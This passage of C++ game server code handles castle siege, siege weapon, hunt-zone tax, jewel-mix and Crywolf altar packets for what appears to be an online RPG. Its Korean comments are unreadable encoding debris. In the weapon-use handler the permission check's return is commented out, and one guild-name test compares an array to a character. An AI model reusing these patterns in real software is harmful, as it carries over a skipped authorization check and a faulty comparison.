	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x17, sizeof(PMSG_ANS_NOTIFYCSSTART));
	pMsgResult.btStartState		= btStartState;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);

#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x18] ���� ������ ���� ���¸� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsNotifyProgress		(INT iIndex, BYTE btCastleSiegeState, LPSTR lpszGuildName)
{
	// ��� �����鿡 ���������� �����ؾ� �� !!

	if (lpszGuildName == NULL)
		return;

	PMSG_ANS_NOTIFYCSPROGRESS pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x18, sizeof(PMSG_ANS_NOTIFYCSPROGRESS));
	pMsgResult.btCastleSiegeState		= btCastleSiegeState;
	memset(pMsgResult.szGuildName, 0, sizeof(pMsgResult.szGuildName));
	memcpy(pMsgResult.szGuildName, lpszGuildName, 8);

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1A] ���� �ʼ������� ����� ������ �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsMapSvrTaxInfo			(INT iIndex, BYTE btTaxType, BYTE btTaxRate)
{
	// ��� �����鿡 ���������� �����ؾ� �� !!
	
	PMSG_ANS_MAPSVRTAXINFO pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1A, sizeof(PMSG_ANS_MAPSVRTAXINFO));
	pMsgResult.btTaxType	= btTaxType;
	pMsgResult.btTaxRate	= btTaxRate;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


//----------------------------------------------------------------------------
// CG [0xB2][0x1B] �̴ϸ� �����͸� �ֱ������� ������ ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsMiniMapData				(LPPMSG_REQ_MINIMAPDATA lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	if (!gObjIsConnected(iIndex))
		return;

	// �̴ϸ� �����͸� ���� ������ �ִ����� Ȯ���Ѵ�.
	if (gObj[iIndex].m_btCsJoinSide <= 0 ||
		g_CastleSiege.CheckUnionGuildMaster(iIndex) == FALSE
		)
	{
		// ������ ����.
		GCAnsCsMiniMapData (iIndex, 3);
		return;
	}
	
	// ���簡 ������ ������ Ȯ���Ѵ�.
	if (g_CastleSiege.GetCastleState() != CASTLESIEGE_STATE_STARTSIEGE) {
		// ������ ���� �ƴϴ�.
		GCAnsCsMiniMapData (iIndex, 2);
		return;
	}
	
	// �̴ϸ� ������ ��û�ڷ� ����Ѵ�.
	g_CastleSiege.AddMiniMapDataReqUser (iIndex);
	GCAnsCsMiniMapData (iIndex, 1);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1B] �̴ϸ� �����͸� �ֱ������� ������ ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsMiniMapData				(INT iIndex, BYTE btResult)
{
	PMSG_ANS_MINIMAPDATA pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1B, sizeof(PMSG_ANS_MINIMAPDATA));
	pMsgResult.btResult		= btResult;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


//----------------------------------------------------------------------------
// CG [0xB2][0x1C] �̴ϸ� �����͸� ���̻� ������ ����� �˸� (0xC1)
//----------------------------------------------------------------------------
void CGReqStopCsMiniMapData			(LPPMSG_REQ_STOPMINIMAPDATA lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	if (!gObjIsConnected(iIndex))
		return;

	// �̴ϸ� ������ ��û�ڸ� �����Ѵ�.
	g_CastleSiege.DelMiniMapDataReqUser (iIndex);
#endif
}


//----------------------------------------------------------------------------
// CG [0xB2][0x1D] ������ ������� �渶�� ����鿡�� ���� ���� (0xC1)
//----------------------------------------------------------------------------
void CGReqCsSendCommand				(LPPMSG_REQ_CSCOMMAND lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	if (!gObjIsConnected(iIndex))
		return;
	
	// ����� ���� �� �ִ� ������ �ִ��� Ȯ���Ѵ�.
	if (gObj[iIndex].m_btCsJoinSide <= 0 ||
		g_CastleSiege.CheckUnionGuildMaster(iIndex) == FALSE
		)
	{
		// ������ ����.
		return;
	}
	
	// ���簡 ������ ������ Ȯ���Ѵ�.
	if (g_CastleSiege.GetCastleState() != CASTLESIEGE_STATE_STARTSIEGE) {
		// ������ ���� �ƴϴ�.
		return;
	}
	
	// ����鿡�� ����� ������.
	GCAnsCsSendCommand (gObj[iIndex].m_btCsJoinSide, lpMsg->btTeam, lpMsg->btX, lpMsg->btY, lpMsg->btCommand);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1D] ������ ������� �渶�� ����鿡�� ���� ���� ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsSendCommand				(INT iCsJoinSide, BYTE btTeam, BYTE btX, BYTE btY, BYTE btCommand)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	PMSG_ANS_CSCOMMAND pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1D, sizeof(PMSG_ANS_CSCOMMAND));
	pMsgResult.btTeam		= btTeam;
	pMsgResult.btX			= btX;
	pMsgResult.btY			= btY;
	pMsgResult.btCommand	= btCommand;

	for (INT iIndex = ALLOC_USEROBJECTSTART ; iIndex < MAX_OBJECT ; iIndex++) {
		if (!gObjIsConnected(iIndex))
			continue;

		if (gObj[iIndex].m_btCsJoinSide == iCsJoinSide) {
			if (gObj[iIndex].MapNumber == MAP_INDEX_CASTLESIEGE) {
				DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
			}
		}
	}
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1E] ������ �� ���� �ð��� ����ڵ鿡�� �ֱ������� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsLeftTimeAlarm			(BYTE btHour, BYTE btMinute)
{
	PMSG_ANS_CSLEFTTIMEALARM pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1E, sizeof(PMSG_ANS_CSLEFTTIMEALARM));
	pMsgResult.btHour		= btHour;
	pMsgResult.btMinute		= btMinute;

	for (INT iIndex = ALLOC_USEROBJECTSTART ; iIndex < MAX_OBJECT ; iIndex++) {
		if (!gObjIsConnected(iIndex))
			continue;
		
		DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
	}
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1E] ������ �� ���� �ð��� �Ѹ��� ����ڿ��� �˸� (0xC1)
//----------------------------------------------------------------------------
void GCAnsSelfCsLeftTimeAlarm		(INT iIndex, BYTE btHour, BYTE btMinute)
{
	PMSG_ANS_CSLEFTTIMEALARM pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1E, sizeof(PMSG_ANS_CSLEFTTIMEALARM));
	pMsgResult.btHour		= btHour;
	pMsgResult.btMinute		= btMinute;

	if (!gObjIsConnected(iIndex))
		return;
	
	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


//----------------------------------------------------------------------------
// CG [0xB2][0x1F] �� ����� ���� ���ɿ��� ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsSetEnterHuntZone		(LPPMSG_REQ_CSHUNTZONEENTER lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111
	if (!gObjIsConnected(iIndex))
		return;
	
	// ����� ���� �� �ִ� ������ �ִ��� Ȯ���Ѵ�.
	if( g_CastleSiege.CheckCastleOwnerMember(iIndex) == FALSE )
	{
		// ������ ����.
		GCAnsCsSetEnterHuntZone (iIndex, 2, lpMsg->btHuntZoneEnter);
		return;
	}
	
	// ���簡 ������ ������ Ȯ���Ѵ�.
	if (g_CastleSiege.GetCastleState() == CASTLESIEGE_STATE_STARTSIEGE) {
		// ������ ���̸� ���忩�θ� ������ �� ����.
		GCAnsCsSetEnterHuntZone (iIndex, 0, lpMsg->btHuntZoneEnter);
		return;
	}
	
	g_CastleSiege.SetHuntZoneEnter(lpMsg->btHuntZoneEnter);
	GCAnsCsSetEnterHuntZone (iIndex, 1, lpMsg->btHuntZoneEnter);
#endif
}


//----------------------------------------------------------------------------
// GC [0xB2][0x1F] �� ����� ���� ���ɿ��� ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsCsSetEnterHuntZone		(INT iIndex, BYTE btResult, BYTE btEnterHuntZone)
{
	PMSG_ANS_CSHUNTZONEENTER pMsgResult;
	pMsgResult.h.set((LPBYTE)&pMsgResult, 0xB2, 0x1F, sizeof(PMSG_ANS_CSHUNTZONEENTER));
	pMsgResult.btResult			= btResult;
	pMsgResult.btHuntZoneEnter	= btEnterHuntZone;

	DataSend(iIndex, (LPBYTE)&pMsgResult, pMsgResult.h.size);
}


//----------------------------------------------------------------------------
// CG [0xB3] �������� DB�� �����Ǵ� Ư�� NPC�� ����� ��û -> ����üũ, �������� ����
//----------------------------------------------------------------------------
void CGReqNpcDbList					(LPPMSG_REQ_NPCDBLIST lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;

	// ��忡 ���ԵǾ����� �ʴٸ� �����Ѵ�.
	if (!strcmp(gObj[iIndex].GuildName, ""))
		return;

	// �ʿ��ϴٸ� ��û���� ������ üũ�Ѵ�. (������ Ư�� ������ �ƴ϶�� �Ұ�)
	if (g_CastleSiege.CheckGuildOwnCastle(gObj[iIndex].GuildName) == FALSE || 
		(gObj[iIndex].GuildStatus != G_MASTER && gObj[iIndex].GuildStatus != G_SUB_MASTER)
		) 
	{
		LogAddC(LOGC_RED,"[CastleSiege] CGReqNpcDbList() ERROR - Authority Fail [%s][%s], Guild:(%s)(%d)",
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			gObj[iIndex].GuildName,
			gObj[iIndex].GuildStatus
			);

		PMSG_ANS_NPCDBLIST pMsgSend;
		pMsgSend.h.set((LPBYTE)&pMsgSend, 0xB3, sizeof(PMSG_ANS_NPCDBLIST));
		pMsgSend.iCount		= 0;
		pMsgSend.btResult	= 2;	// ������ ����.
		DataSend(iIndex, (LPBYTE)&pMsgSend, sizeof(PMSG_ANS_NPCDBLIST));
		return;
	}

	switch(lpMsg->btMonsterCode) {
	case 1 :		// ����
		{
			g_CastleSiege.SendNpcStateList(iIndex, 277);
		}
		break;
	case 2 :		// ����
		{
			g_CastleSiege.SendNpcStateList(iIndex, 283);
		}
		break;
	}

#endif
}


//----------------------------------------------------------------------------
// CG [0xB4] ���� ��� ����� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsRegGuildList		(LPPMSG_REQ_CSREGGUILDLIST lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;

	// ���� ��û ������� ������ ��û�� �� �ִ�.
	
	GS_GDReqAllGuildMarkRegInfo (g_MapServerManager.GetMapSvrGroup(), iIndex);

#endif
}


//----------------------------------------------------------------------------
// CG [0xB5] ���� ���� ����� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqCsAttkGuildList		(LPPMSG_REQ_CSATTKGUILDLIST lpMsg, INT iIndex)
{
#ifdef CASTLE_MAIN_SCHEDULER_20041111

	if(lpMsg == NULL)
		return;

	CHAR cBUFFER[sizeof(PMSG_ANS_CSATTKGUILDLIST) + sizeof(PMSG_CSATTKGUILDLIST) * (MAX_CS_GUILD_COUNT+1)];
	LPPMSG_ANS_CSATTKGUILDLIST lpMsgSend = (LPPMSG_ANS_CSATTKGUILDLIST) cBUFFER;
	LPPMSG_CSATTKGUILDLIST lpMsgSendBody = (LPPMSG_CSATTKGUILDLIST) (cBUFFER + sizeof(PMSG_ANS_CSATTKGUILDLIST));

	INT iCount						= 0;	// ������ ���� ����� ����

	// ���� ���� ������� ������ ��û�� �� �ִ�.
	lpMsgSend->btResult				= g_CastleSiege.GetCsAttkGuildList (lpMsgSendBody, iCount);
	lpMsgSend->iCount				= iCount;
	if (lpMsgSend->iCount < 0)						lpMsgSend->iCount	 = 0;
	if (lpMsgSend->iCount > MAX_CS_GUILD_COUNT)		lpMsgSend->iCount	 = MAX_CS_GUILD_COUNT;

	lpMsgSend->h.set((LPBYTE)lpMsgSend, 0xB5, sizeof(PMSG_ANS_CSATTKGUILDLIST) + sizeof(PMSG_CSATTKGUILDLIST) * lpMsgSend->iCount);
	DataSend(iIndex, (LPBYTE)lpMsgSend, sizeof(PMSG_ANS_CSATTKGUILDLIST) + sizeof(PMSG_CSATTKGUILDLIST) * lpMsgSend->iCount);

#endif
}


#endif




#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116
//----------------------------------------------------------------------------
// CG [0xB7][0x01] Weapon ��� ��û
//----------------------------------------------------------------------------
void CGReqWeaponUse( LPPMSG_REQ_USEWEAPON aRecv, INT iIndex )
{
	// 0. ��� �� �� �ִ��� �˻�
	WORD wObjIndex = MAKEWORD( aRecv->btObjIndexL, aRecv->btObjIndexH );

	if( !CHECK_LIMIT( wObjIndex, MAX_OBJECT) )
		return;

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

	LPOBJECTSTRUCT	lpOwnerObj = &gObj[iIndex];
	LPOBJECTSTRUCT	lpWeaponObj = &gObj[wObjIndex];
	
	if( lpOwnerObj->Type != OBJTYPE_CHARACTER )
		return;

	if( lpOwnerObj->m_IfState.use!=1 
		|| lpOwnerObj->m_IfState.type!=I_CS_MACHINE_ATTACK
		|| lpOwnerObj->m_IfState.type!=I_CS_MACHINE_DEFENSE )
	{
		//return;
	}

	if( lpWeaponObj->Type != OBJTYPE_NPC )
		return;

	
	// 1. ���� ��ġ�� �����Ѵ�.
	PMSG_ANS_USEWEAPON pMsg = { 0, };
	PHeadSubSetB((LPBYTE)&pMsg, 0xB7, 0x01, sizeof( pMsg) );
	pMsg.btResult = WEAPON_USE_SUCCESS;

	if( lpWeaponObj->Class == NPC_SIEGE_MACHINE_ATTACK )
	{
		pMsg.btWeaponType = WEAPON_TYPE_CASTLE_ATTACKER;
		pMsg.btObjIndexH  = HIBYTE( wObjIndex );
		pMsg.btObjIndexL  = LOBYTE( wObjIndex );

		// �̰͵� ��ũ��Ʈ�� ����
		g_CsNPC_Weapon.GetTargetPointXY( lpWeaponObj->Class, aRecv->btTargetIndex-1, pMsg.btPointX, pMsg.btPointY);
	}
	else if( lpWeaponObj->Class == NPC_SIEGE_MACHINE_DEFENSE )
	{
		pMsg.btWeaponType = WEAPON_TYPE_CASTLE_DEFENDER;
		pMsg.btObjIndexH  = HIBYTE( wObjIndex );
		pMsg.btObjIndexL  = LOBYTE( wObjIndex );

		g_CsNPC_Weapon.GetTargetPointXY( lpWeaponObj->Class, aRecv->btTargetIndex-1, pMsg.btPointX, pMsg.btPointY);
	}
	
	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );

	// Weapon ����� ���� ���� ĳ���͵鿡�� �˸���.
	pMsg.btResult = 0x02; // WEAPON_OTHER_PERSON_USE_SUCCESS

	for( int n=0; n<MAXVIEWPORTOBJECT; n++ )
	{
		if( lpWeaponObj->VpPlayer2[n].type == OBJTYPE_CHARACTER )
		{
			if( lpWeaponObj->VpPlayer2[n].state )
			{
				// Weapon ����ڿ��� 0x01��
				if( iIndex != lpWeaponObj->VpPlayer2[n].number )
					DataSend(lpWeaponObj->VpPlayer2[n].number, (LPBYTE)&pMsg, sizeof(pMsg));
			}
		}
	}

	// 2. ����Ʈ�� �����Ѵ�.
	// 2.1 �߻� Notify
	gObjNotifyUseWeaponV1( lpOwnerObj, lpWeaponObj, pMsg.btPointX, pMsg.btPointY );

	// 2.2 �������� ����ؼ� �����ش�. Delay Msg?
	g_CsNPC_Weapon.SetWeaponCalDamageInfo( wObjIndex, pMsg.btPointX, pMsg.btPointY, 10000 );

}

//----------------------------------------------------------------------------
// CG[0xB7][0x04] Weapon �ִϸ��̼��� �������� �˸�. ������ ���� ��û
//----------------------------------------------------------------------------
void CGReqWeaponDamageValue( LPPMSG_REQ_WEAPON_DAMAGE_VALUE aRecv, INT iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

	BYTE btTargetX = 0;
	BYTE btTargetY = 0;

	WORD wObjIndex = MAKEWORD( aRecv->btObjIndexL, aRecv->btObjIndexH );

	if( g_CsNPC_Weapon.GetWeaponCalDamageInfo( wObjIndex, btTargetX, btTargetY ) == TRUE )
	{
		
		gObjNotifyUseWeaponDamage( &gObj[wObjIndex], btTargetX, btTargetY );

	}
	else
	{
		MsgOutput( iIndex, lMsg.Get(1648) ); // "������ Damage ������ ã�� �� ����."
		// Damage ������ ã�� �� ����
	}
}

#endif

#ifdef CASTLE_NPC_LIFESTONE_WORK_20041208

void GCSendObjectCreationState( INT iObjectIndex )
{
	if( !CHECK_LIMIT( iObjectIndex, MAX_OBJECT) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iObjectIndex];

	PMSG_NOTIFY_OBJECT_CREATION_STATE pMsg = { 0, };

	
	// 1. ������ ������ ��� 
	if( lpObj->Class == NPC_INDEX_LIFESTONE )
	{
		PHeadSubSetB((LPBYTE)&pMsg, 0xB9, 0x01, sizeof( pMsg) );
		pMsg.btObjIndexH = HIBYTE(iObjectIndex);
		pMsg.btObjIndexL = LOBYTE(iObjectIndex);

		pMsg.btCreationState = lpObj->m_btCreationState;

		// ������ ������ ���� �ִ� ĳ���͵����� ����.
		MsgSendV2( lpObj, (LPBYTE)&pMsg, sizeof(pMsg) );
	}	
}

#endif


#ifdef ADD_NEW_CASTLE_FLAG_01_20041227
//----------------------------------------------------------------------------
// GC GC[0xB9][0x02] ���� ����� ��ũ�� �����ش�.
//----------------------------------------------------------------------------
void CGReqGuildMarkOfCastleOwner( LPPMSG_REQ_GUILDMARK_OF_CASTLEOWNER aRecv, INT iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	// ���� ��带 ã�´�.
	char szGuildName[MAX_GUILDNAMESTRING + 1 ] = { 0, };

	CopyMemory( szGuildName, g_CastleSiegeSync.GetCastleOwnerGuild(), MAX_GUILDNAMESTRING );

	if( szGuildName != '\0' )
	{
		LPGUILD_INFO lpCastleOwnerGuild = Guild.SearchGuild( szGuildName );

		if( lpCastleOwnerGuild != NULL )
		{
			PMSG_ANS_GUILDMARK_OF_CASTLEOWNER pMsg = {0,};
			PHeadSubSetB((LPBYTE)&pMsg, 0xB9, 0x02, sizeof( pMsg) );
			
			CopyMemory( pMsg.GuildMarkOfCastleOwner, lpCastleOwnerGuild->Mark, 32 );
			
			DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );

			//MsgOutput( iIndex, "[�׽�Ʈ]���� ��帶ũ ����");
			
		}		
	}
}

#endif



#ifdef ADD_CASTLE_HUNTZONE_NPC_01_20050111
//----------------------------------------------------------------------------
// GC GC[0xB9][0x04] Castle�� ����� �����⿡�� '����'�� ���� ���� ��û
//----------------------------------------------------------------------------
//void CGReqSettingOfCastleHuntZoneEntrance( LPPMSG_REQ_SETTING_OF_CASTLE_HUNTZONE aRecv, INT iIndex )
//{
//	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
//		return;
//
//	MsgOutput( iIndex, "[�׽�Ʈ]'����'�� ���� ���� ��û");
//
//	LPOBJECTSTRUCT lpObj = &gObj[iIndex];
//
//	PMSG_ANS_SETTING_OF_CASTLE_HUNTZONE	pMsg = {0,};
//	PHeadSubSetB((LPBYTE)&pMsg, 0xB9, 0x04, sizeof( pMsg) );
//
//	pMsg.btResult = CASTLE_HUNTZONE_SETTING_FAIL;
//
//	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
//
//}

//----------------------------------------------------------------------------
// GC GC[0xB9][0x05] ����� �����⿡�� ���� ��û
//---------------------------------------------------------------------------
void CGReqCastleHuntZoneEntrance( LPPMSG_REQ_MOVE_TO_CASTLE_HUNTZONE aRecv, INT iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

//	MsgOutput( iIndex, "[�׽�Ʈ]����� �����⿡�� ���� ��û");

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

	PMSG_ANS_MOVE_TO_CASTLE_HUNTZONE	pMsg = {0,};
	PHeadSubSetB((LPBYTE)&pMsg, 0xB9, 0x05, sizeof( pMsg) );

	pMsg.btResult = CASTLE_HUNTZONE_USAGE_DISABLE;
	
	INT iEnterTaxMoney	= 0;
#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130
	iEnterTaxMoney	= g_CastleSiegeSync.GetTaxHuntZone(lpObj->m_Index);
	if (iEnterTaxMoney < 0)
		iEnterTaxMoney	= 0;
#endif

	BOOL bPermission = FALSE;
	
	// 1. �Ϲ��� ����� ��� ���� ����
	if( g_CastleSiege.GetHuntZoneEnter() )
		bPermission = TRUE;

	// 2. �� ����� ��� ��û�� ���� ���
	if( lpObj->lpGuild != NULL )
	{
		// 2-1. ���� ���տ� �˻�
		if( g_CastleSiege.CheckCastleOwnerUnionMember(lpObj->m_Index) )
		{
			bPermission = TRUE;
		}

		// 2-2. ���� ���ո��������� �˻�
		if( g_CastleSiege.CheckCastleOwnerMember(lpObj->m_Index) )
		{
			bPermission = TRUE;
		}
	}
	else
	{
		if( g_CastleSiege.GetHuntZoneEnter() )
		{
			bPermission = TRUE;
		}
	}

	if( bPermission == TRUE
#ifdef MODIFY_CASTLE_HUNTZONE_TAX_BUGFIX_20070806
		&& lpObj->Money >= iEnterTaxMoney 
#else
		&& lpObj->Money > iEnterTaxMoney 
#endif
		&& lpObj->MapNumber == MAP_INDEX_CASTLESIEGE )
	{
		if( gObjMoveGate(lpObj->m_Index, 95) == TRUE )
		{
			pMsg.btResult = CASTLE_HUNTZONE_USAGE_ENABLE;
		
			INT iOldMoney	= lpObj->Money;
			lpObj->Money	-= iEnterTaxMoney;
#ifdef MU_CASTLESIEGE_SERVER_SYNC_20041130		// �������� ������ �� ������ ����
			g_CastleSiegeSync.AddTributeMoney(iEnterTaxMoney);
#endif
			
			if( lpObj->Money < 0 )
				lpObj->Money = 0;
			
			GCMoneySend(lpObj->m_Index, lpObj->Money);
			LogAddTD("[Castle HuntZone] [%s][%s] - Entrance TAX : %d - %d = %d", 
				lpObj->AccountID, lpObj->Name, iOldMoney, iEnterTaxMoney, lpObj->Money);
		}
	}

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
	
}

#endif


#ifdef JEWEL_MIX_SYSTEM_20050309			// �������� �ý��� �߰���Ŷ

//----------------------------------------------------------------------------
// CG [0xBC][0x00] �������� ���� ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqJewelMix					(LPPMSG_REQ_JEWEL_MIX lpMsg, INT iIndex)
{
	if (lpMsg == NULL)
		return;

	CJewelMixSystem::MixJewel(iIndex, lpMsg->btJewelType, lpMsg->btJewelMix);
}

//----------------------------------------------------------------------------
// GC [0xBC][0x00] �������� ���� ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsJewelMix					(INT iIndex, INT iResult)
{
	PMSG_ANS_JEWEL_UNMIX pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0xBC, 0x00, sizeof(pMsg) );
	pMsg.btResult	= iResult;

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
}

//----------------------------------------------------------------------------
// CG [0xBC][0x01] �������� ��ü ��û (0xC1)
//----------------------------------------------------------------------------
void CGReqJewelUnMix				(LPPMSG_REQ_JEWEL_UNMIX lpMsg, INT iIndex)
{
	if (lpMsg == NULL)
		return;

	CJewelMixSystem::UnMixJewel(iIndex, lpMsg->btJewelType, lpMsg->btJewelLevel, lpMsg->btJewelPos);
}

//----------------------------------------------------------------------------
// GC [0xBC][0x01] �������� ��ü ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsJewelUnMix				(INT iIndex, INT iResult)
{
	PMSG_ANS_JEWEL_UNMIX pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0xBC, 0x01, sizeof(pMsg) );
	pMsg.btResult	= iResult;

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
}

#endif


#ifdef MU_CRYWOLF_CL_PROTOCOL_20050505	// ũ���̿��� - �� Ŭ���̾�Ʈ ���� �������� ó�� �Լ�

#include "Crywolf.h"

//----------------------------------------------------------------------------
// CG [0xBD][0x00] Ŭ���̾�Ʈ�� ũ���̿��� ���� �� ���������� ��û
//----------------------------------------------------------------------------
void CGReqCrywolfInfo( LPPMSG_REQ_CRYWOLF_INFO lpMsg, int iIndex )
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

	LPOBJECTSTRUCT lpObj = &gObj[iIndex];

#ifdef CRYWOLF_MAIN_SCHEDULER_20050505
	GCAnsCrywolfInfo( iIndex, g_Crywolf.GetOccupationState(), g_Crywolf.GetCrywolfState() );
#else
	GCAnsCrywolfInfo( iIndex, g_CrywolfSync.GetOccupationState(), g_CrywolfSync.GetCrywolfState() );
#endif
}

void GCAnsCrywolfInfo( int iIndex, BYTE btOccupationState, BYTE btCrywolfState )
{
	PMSG_ANS_CRYWOLF_INFO	pMsg = {0,};
	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x00, sizeof( pMsg) );

	pMsg.btOccupationState	= btOccupationState;
	pMsg.btCrywolfState		= btCrywolfState;

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
}

//----------------------------------------------------------------------------
// CG [0xBD][0x03] Ư�� ���ܰ� ���� ��� ��û
//----------------------------------------------------------------------------
void CGReqAlatrContract( LPPMSG_REQ_CRYWOLF_ALTAR_CONTRACT lpMsg, int iIndex )
{
	int iAltarIndex = MAKEWORD( lpMsg->btObjIndexL, lpMsg->btObjIndexH );

	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

	if( !CHECK_LIMIT( iAltarIndex, MAX_OBJECT) )
		return;

	LPOBJECTSTRUCT lpObj		= &gObj[iIndex];
	LPOBJECTSTRUCT lpAltarObj	= &gObj[iAltarIndex];

	if( !CHECK_CRYWOLF_NPC_ALTAR(lpAltarObj->Class) )
		return;

	if( !gObjIsConnected(lpObj) )
		return;

	PMSG_ANS_CRYWOLF_ALTAR_CONTRACT	pMsg = {0,};
	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x03, sizeof( pMsg) );

	pMsg.btResult = 0;

	// 1. > ����� ���� �� �ִ� ���� ���� üũ
	pMsg.btAltarState	= g_CrywolfNPC_Altar.GetAltarState( lpAltarObj->Class );

	pMsg.btObjIndexH	= lpMsg->btObjIndexH;
	pMsg.btObjIndexL	= lpMsg->btObjIndexL;
	
	if( pMsg.btAltarState == CRYWOLF_ALTAR_STATE_NONE 
		&& lpObj->Type == OBJTYPE_CHARACTER 
		&& lpObj->Class == CLASS_ELF 

#ifdef MODIFY_CRYWOLF_ELF_ALTAR_LIMIT_LEVEL_CHANGE_20060404
		&& lpObj->Level >= 260
#else	// #ifdef MODIFY_CRYWOLF_ELF_ALTAR_LIMIT_LEVEL_CHANGE_20060404
		
#ifdef FOR_NEW_TESTSERVER
		&& lpObj->Level >= 300
#else
		&& lpObj->Level >= 350
#endif
		
#endif	// #ifdef MODIFY_CRYWOLF_ELF_ALTAR_LIMIT_LEVEL_CHANGE_20060404
	  )
	{
		if( g_CrywolfNPC_Altar.SetAltarUserIndex( iAltarIndex, lpAltarObj->Class, iIndex ) )
			pMsg.btResult = 1;
	}
	else
	{
		// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
#ifdef FOR_NEW_TESTSERVER
		// MODIFY_CRYWOLF_ELF_ALTAR_LIMIT_LEVEL_CHANGE_20060404 260���� ����
		MsgOutput( iIndex, lMsg.Get(3336) );			// "300 ���� �̻��� ������ ��� �����մϴ�."  
#else
		// MODIFY_CRYWOLF_ELF_ALTAR_LIMIT_LEVEL_CHANGE_20060404 260���� ����
		MsgOutput( iIndex, lMsg.Get(3337) );			// "350 ���� �̻��� ������ ��� �����մϴ�."
#endif
	}
		
	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
}

//----------------------------------------------------------------------------
// CG [0xBD][0x09] ũ���̿��� ���� +ī��������Ȯ��
//----------------------------------------------------------------------------
void CGReqPlusChaosRate( LPPMSG_REQ_CRYWOLF_BENEFIT_PLUS_CHAOSRATE lpMsg, int iIndex )
{	
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;
	
	PMSG_ANS_CRYWOLF_BENEFIT_PLUS_CHAOSRATE	pMsg = {0,};
	PHeadSubSetB((LPBYTE)&pMsg, 0xBD, 0x09, sizeof( pMsg) );
	if( g_CrywolfSync.GetOccupationState() == CRYWOLF_OCCUPATION_STATE_PEACE && g_iCrywolfApplyMvpBenefit)
	{
		pMsg.btPlusChaosRate = g_CrywolfSync.GetPlusChaosRate();
	}

	DataSend( iIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
}
#endif

#ifdef PCBANG_COUPON_EVENT_20060124
//----------------------------------------------------------------------------
// CG [0xD0][0x01] ���� ������ �߱� ��û
//----------------------------------------------------------------------------
void CGReqPCBangCouponItem(LPPMSG_REQ_PCBANG_COUPON_ITEM lpMsg, int iIndex)
{
	if( !CHECK_LIMIT( iIndex, MAX_OBJECT) )
		return;

